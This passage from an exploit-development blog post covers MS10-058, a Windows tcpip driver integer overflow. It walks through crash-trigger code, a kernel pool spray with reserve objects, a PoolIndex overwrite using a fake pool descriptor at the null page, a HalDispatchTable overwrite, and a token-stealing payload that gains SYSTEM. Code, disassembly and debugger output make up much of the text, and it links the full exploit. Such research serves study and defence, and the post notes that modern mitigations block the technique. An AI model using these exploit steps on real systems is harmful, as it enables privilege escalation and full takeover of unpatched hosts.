IppFlattenAddressList(x,x)+28   cmp     dword ptr [ecx+8], 1Ch
IppFlattenAddressList(x,x)+2C   jz      short loc_4DCA9</p>

<p>IppFlattenAddressList(x,x)+9C   cmp     word ptr [edx], 17h
IppFlattenAddressList(x,x)+A0   jnz     short loc_4DCA2
```</p>

<p>The copy will stop if those checks fail. That means that each <em>SOCKET_ADDRESS</em> has a length of 0x1c and that each <em>SOCKADDR</em> buffer pointed to by the socket address begins with a 0x17 byte. Long story short :</p>

<ul>
<li>Make the multiplication at <em>IppSortDestinationAddresses+29</em> overflow</li>
<li>Get a non-paged pool chunk at <em>IppSortDestinationAddresses+3e</em> that is too little</li>
<li>Write user controlled memory to this chunk in <em>IppFlattenAddressList+67</em> and overflow as much as you want (provided that you take care of the 0x1c and 0x17 bytes)</li>
</ul>


<p>The code below should trigger a BSOD. Now the objective is to place an object after our vulnerable object and modify pool metadata.
```text
WSADATA wd = {0};
SOCKET sock = 0;
SOCKET_ADDRESS_LIST <em>pwn = (SOCKET_ADDRESS_LIST</em>)malloc(sizeof(INT) + 4 * sizeof(SOCKET_ADDRESS));
DWORD cb;</p>

<p>memset(buffer,0x41,0x1c);
buffer[0] = 0x17;
buffer[1] = 0x00;
sa.lpSockaddr = (LPSOCKADDR)buffer;
sa.iSockaddrLength = 0x1c;
pwn->iAddressCount = 0x40000003;
memcpy(&amp;pwn->Address[0],&amp;sa,sizeof(<em>SOCKET_ADDRESS));
memcpy(&amp;pwn->Address[1],&amp;sa,sizeof(</em>SOCKET_ADDRESS));
memcpy(&amp;pwn->Address[2],&amp;sa,sizeof(<em>SOCKET_ADDRESS));
memcpy(&amp;pwn->Address[3],&amp;sa,sizeof(</em>SOCKET_ADDRESS));</p>

<p>WSAStartup(MAKEWORD(2,0), &amp;wd)
sock = socket(AF_INET6, SOCK_STREAM, IPPROTO_TCP);
WSAIoctl(sock, SIO_ADDRESS_LIST_SORT, pwn, 0x1000, pwn, 0x1000, &amp;cb, NULL, NULL)
```</p>

<h1>Spraying the pool</h1>

<h2>Non paged objects</h2>

<p>There are several objects that we could easily use to manipulate the non-paged pool. For instance we could use semaphore objects or reserve objects.
<code>text
*8516b848 size:   48 previous size:   48  (Allocated) Sema
*85242d08 size:   68 previous size:   68  (Allocated) User
*850fcea8 size:   60 previous size:    8  (Allocated) IoCo
</code></p>

<p>We are trying to overflow a pool chunk with a size being a multiple of 0x1c. As 0x1c*3=0x54, the driver is going to request 0x54 bytes and being therefore given a chunk of 0x60 bytes. This is exactly the size of an I/O completion reserve object. To allocate a IoCo, we just need to call <em>NtAllocateReserveObject</em> with the object type IOCO. To deallocate the IoCo, we could simply close the associate the handle. Doing this would make the object manager release the object. For more in-depth information about reserve objects, you can read j00ru’s article <a href="http://magazine.hitb.org/issues/HITB-Ezine-Issue-003.pdf">[4]</a>.</p>

<p>In order to spray, we are first going to allocate a lot of IoCo without releasing them so as to fill existing holes in the pool. After that, we want to allocate IoCo and make holes of 0x60 bytes. This is illustrated in the <em>sprayIoCo()</em> function of my PoC. Now we are able have an IoCo pool chunk following an Ipas pool chunk (as you might have noticed, ‘Ipas’ is the tag used by the tcpip driver). Therefore, we can easily corrupt its pool header.</p>

<h2>nt!PoolHitTag</h2>

<p>If you want to debug a specific call to <em>ExFreePoolWithTag</em> and simply break on it you’ll see that there are way too much frees (and above all, this is very slow when kernel debugging). A simple approach to circumvent this issue is to use pool hit tags.</p>

<p><code>text
ExFreePoolWithTag(x,x)+62F                  and     ecx, 7FFFFFFFh
ExFreePoolWithTag(x,x)+635                  mov     eax, ebx
ExFreePoolWithTag(x,x)+637                  mov     ebx, ecx
ExFreePoolWithTag(x,x)+639                  shl     eax, 3
ExFreePoolWithTag(x,x)+63C                  mov     [esp+58h+var_28], eax
ExFreePoolWithTag(x,x)+640                  mov     [esp+58h+var_2C], ebx
ExFreePoolWithTag(x,x)+644                  cmp     ebx, _PoolHitTag
ExFreePoolWithTag(x,x)+64A                  jnz     short loc_5180E9
ExFreePoolWithTag(x,x)+64C                  int     3               ; Trap to Debugger
</code></p>

<p>As you can see on the listing above, <em>nt!PoolHitTag</em> is compared against the pool tag of the currently freed chunk. Notice the mask : it allows you to use the raw tag. (for instance ‘oooo’ instead of 0xef6f6f6f) By the way, you are not required to use the genuine tag. (eg : you can use ‘ooo’ for ‘IoCo’) Now you know that you can <em>ed nt!PoolHitTag ‘oooo’</em> to debug your exploit.</p>

<h1>Exploitation technique</h1>

<h2>Basic structure</h2>

<p>As the internals of the pool are thoroughly detailed in Tarjei Mandt’s paper <a href="http://www.mista.nu/research/MANDT-kernelpool-PAPER.pdf">[3]</a>, I will only be giving a glimpse at the pool descriptor and the pool header structures. The pool memory is divided into several types of pool. Two of them are the paged pool and the non-paged pool. A pool is described by a <em>_POOL_DESCRIPTOR</em> structure as seen below.
<code>text
0: kd&gt; dt _POOL_TYPE
ntdll!_POOL_TYPE
   NonPagedPool = 0n0
   PagedPool = 0n1
</code>
<code>text
0: kd&gt; dt _POOL_DESCRIPTOR
nt!_POOL_DESCRIPTOR
   +0x000 PoolType         : _POOL_TYPE
   +0x004 PagedLock        : _KGUARDED_MUTEX
   +0x004 NonPagedLock     : Uint4B
   +0x040 RunningAllocs    : Int4B
   +0x044 RunningDeAllocs  : Int4B
   +0x048 TotalBigPages    : Int4B
   +0x04c ThreadsProcessingDeferrals : Int4B
   +0x050 TotalBytes       : Uint4B
   +0x080 PoolIndex        : Uint4B
   +0x0c0 TotalPages       : Int4B
   +0x100 PendingFrees     : Ptr32 Ptr32 Void
   +0x104 PendingFreeDepth : Int4B
   +0x140 ListHeads        : [512] _LIST_ENTRY
</code>
A pool descriptor references free memory in a free list called <em>ListHeads</em>. The <em>PendingFrees</em> field references chunks of memory waiting to be freed to the free list. Pointers to pool descriptor structures are stored in arrays such as <em>PoolVector</em> (non-paged) or <em>ExpPagedPoolDescriptor</em> (paged). Each chunk of memory contains a header before the actual data. This is the <em>_POOL_HEADER</em>. It brings information such as the size of the block or the pool it belongs to.</p>

<p><code>text
0: kd&gt; dt _POOL_HEADER
nt!_POOL_HEADER
   +0x000 PreviousSize     : Pos 0, 9 Bits
   +0x000 PoolIndex        : Pos 9, 7 Bits
   +0x002 BlockSize        : Pos 0, 9 Bits
   +0x002 PoolType         : Pos 9, 7 Bits
   +0x000 Ulong1           : Uint4B
   +0x004 PoolTag          : Uint4B
   +0x004 AllocatorBackTraceIndex : Uint2B
   +0x006 PoolTagHash      : Uint2B
</code></p>

<h2>PoolIndex overwrite</h2>

<p>The basic idea of this attack is to corrupt the <em>PoolIndex</em> field of a pool header. This field is used when deallocating paged pool chunks in order to know which pool descriptor it belongs to. It is used as an index in an array of pointers to pool descriptors. Thus, if an attacker is able to corrupt it, he can make the pool manager believe that a specific chunk belongs to another pool descriptor. For instance, one could reference a pool descriptor out of the bounds of the array.</p>

<p><code>text
0: kd&gt; dd ExpPagedPoolDescriptor
82947ae0  84835000 84836140 84837280 848383c0
82947af0  84839500 00000000 00000000 00000000
</code></p>

<p>As there are always some null pointers after the array, it could be used to craft a fake pool descriptor in a user-allocated null page.</p>

<h2>Non paged pool type</h2>

<p>To determine the <em>_POOL_DESCRIPTOR</em> to use, <em>ExFreePoolWithTag</em> gets the appropriate <em>_POOL_HEADER</em> and stores <em>PoolType</em> (<em>watchMe</em>) and <em>BlockSize</em> (<em>var_3c</em>)</p>

<p><code>text
ExFreePoolWithTag(x,x)+465
ExFreePoolWithTag(x,x)+465  loc_517F01:
ExFreePoolWithTag(x,x)+465  mov     edi, esi
ExFreePoolWithTag(x,x)+467  movzx   ecx, word ptr [edi-6]
ExFreePoolWithTag(x,x)+46B  add     edi, 0FFFFFFF8h
ExFreePoolWithTag(x,x)+46E  movzx   eax, cx
ExFreePoolWithTag(x,x)+471  mov     ebx, eax
ExFreePoolWithTag(x,x)+473  shr     eax, 9
ExFreePoolWithTag(x,x)+476  mov     esi, 1FFh
ExFreePoolWithTag(x,x)+47B  and     ebx, esi
ExFreePoolWithTag(x,x)+47D  mov     [esp+58h+var_40], eax
ExFreePoolWithTag(x,x)+481  and     eax, 1
ExFreePoolWithTag(x,x)+484  mov     edx, 400h
ExFreePoolWithTag(x,x)+489  mov     [esp+58h+var_3C], ebx
ExFreePoolWithTag(x,x)+48D  mov     [esp+58h+watchMe], eax
ExFreePoolWithTag(x,x)+491  test    edx, ecx
ExFreePoolWithTag(x,x)+493  jnz     short loc_517F49
</code></p>

<p>Later, if <em>ExpNumberOfNonPagedPools</em> equals 1, the correct pool descriptor will directly be taken from <em>nt!PoolVector[0]</em>. The PoolIndex is not used.</p>

<p>```text
ExFreePoolWithTag(x,x)+5C8  loc_518064:
ExFreePoolWithTag(x,x)+5C8  mov     eax, [esp+58h+watchMe]
ExFreePoolWithTag(x,x)+5CC  mov     edx, _PoolVector[eax*4]
ExFreePoolWithTag(x,x)+5D3  mov     [esp+58h+var_48], edx
ExFreePoolWithTag(x,x)+5D7  mov     edx, [esp+58h+var_40]
ExFreePoolWithTag(x,x)+5DB  and     edx, 20h
ExFreePoolWithTag(x,x)+5DE  mov     [esp+58h+var_20], edx
ExFreePoolWithTag(x,x)+5E2  jz      short loc_5180B6</p>

<p>ExFreePoolWithTag(x,x)+5E8  loc_518084:
ExFreePoolWithTag(x,x)+5E8  cmp     _ExpNumberOfNonPagedPools, 1
ExFreePoolWithTag(x,x)+5EF  jbe     short loc_5180CB</p>

<p>ExFreePoolWithTag(x,x)+5F1  movzx   eax, word ptr [edi]
ExFreePoolWithTag(x,x)+5F4  shr     eax, 9
ExFreePoolWithTag(x,x)+5F7  mov     eax, _ExpNonPagedPoolDescriptor[eax*4]
ExFreePoolWithTag(x,x)+5FE  jmp     short loc_5180C7
```</p>

<p>Therefore, you have to make the pool manager believe that the chunk is located in paged memory.</p>

<h2>Crafting a fake pool descriptor</h2>

<p>As we want a fake pool descriptor at null address. We just allocate this page and put a fake deferred free list and a fake ListHeads.</p>

<p>When freeing a chunk, if the deferred freelist contains at least 0x20 entries, <em>ExFreePoolWithTag</em> is going to actually free those chunks and put them on the appropriate entries of the <em>ListHeads</em>.</p>

<p>```text</p>

<p><em>(PCHAR</em>)0x100 = (PCHAR)0x1208;
<em>(PCHAR</em>)0x104 = (PCHAR)0x20;
for (i = 0x140; i &lt; 0x1140; i += 8) {</p>

<pre><code>*(PCHAR*)i = (PCHAR)WriteAddress-4;
</code></pre>

<p>}
<em>(PINT)0x1200 = (INT)0x060c0a00;
</em>(PINT)0x1204 = (INT)0x6f6f6f6f;
<em>(PCHAR</em>)0x1208 = (PCHAR)0x0;
<em>(PINT)0x1260 = (INT)0x060c0a0c;
</em>(PINT)0x1264 = (INT)0x6f6f6f6f;
```</p>

<h2>Notes</h2>

<p>It is interesting to note that this attack would not work with modern mitigations. Here are a few reasons :</p>

<ul>
<li>Validation of the <em>PoolIndex</em> field</li>
<li>Prevention of the null page allocation</li>
<li><em>NonPagedPoolNX</em> has been introduced with Windows 8 and should be used instead of the <em>NonPagedPool</em> type.</li>
<li>SMAP would prevent access to userland data</li>
<li>SMEP would prevent execution of userland code</li>
</ul>


<h1>Payload and clean-up</h1>

<p>A classical target for write-what-where scenarios is the <em>HalDispatchTable</em>. We just have to overwrite <em>HalDispatchTable+4</em> with a pointer to our payload which is <em>setupPayload()</em>. When we are done, we just have to put back the pointer to <em>hal!HaliQuerySystemInformation</em>. (otherwise you can expect some crashes)</p>

<p>Now that we are able to execute arbitrary code from kernel land we just have to get the <em>_EPROCESS</em> of the attacking process with <em>PsGetCurrentProcess()</em> and walk the list of processes using the <em>ActiveProcessLinks</em> field until we encounter a process with <em>ImageFileName</em> equal to “System”. Then we just replace the access token of the attacker process by the one of the system process. Note that the lazy author of this exploit hardcoded several offsets :).</p>

<p>This is illustrated in <em>payload()</em>.</p>

<p><img class="center" src="/images/MS10-058/screenshot.png"></p>

<h1>Greetings</h1>

<p>Special thanks to my friend <a href="https://twitter.com/0vercl0k">@0vercl0k</a> for his review and help!</p>

<h1>Conclusion</h1>

<p>I hope you enjoyed this article. If you want to know more about the topic, check out the latest papers of Tarjei Mandt, Zhenhua Liu and Nikita Tarakanov. (or wait for other articles ;) )</p>

<p>You can find my code on my new github <a href="https://github.com/JeremyFetiveau/Exploits/blob/master/MS10-058.cpp">[5]</a>. Don’t hesitate to share comments on my article or my exploit if you see something wrong :)</p>

<h1>References</h1>

<p>[1] <a href="http://www.itsecdb.com/oval/definition/oval/gov.nist.USGCB.patch/def/11689/MS10-058-Vulnerabilities-in-TCP-IP-Could-Allow-Elevation-of.html">Vulnerability details on itsecdb</a></p>

<p>[2] <a href="http://technet.microsoft.com/fr-fr/security/bulletin/ms10-058">MS bulletin</a></p>

<p>[3] <a href="http://www.mista.nu/research/MANDT-kernelpool-PAPER.pdf">Kernel Pool Exploitation on Windows 7</a> &ndash; Tarjei Mandt&rsquo;s paper. A must-read!</p>

<p>[4] <a href="http://magazine.hitb.org/issues/HITB-Ezine-Issue-003.pdf">Reserve Objects in Windows 7</a> &ndash; Great j00ru&rsquo;s article!</p>

<p>[5] <a href="https://github.com/JeremyFetiveau/Exploits/blob/master/MS10-058.cpp">The code of my exploit for MS10-058</a></p>
]]></content>
  </entry>
  
</feed>
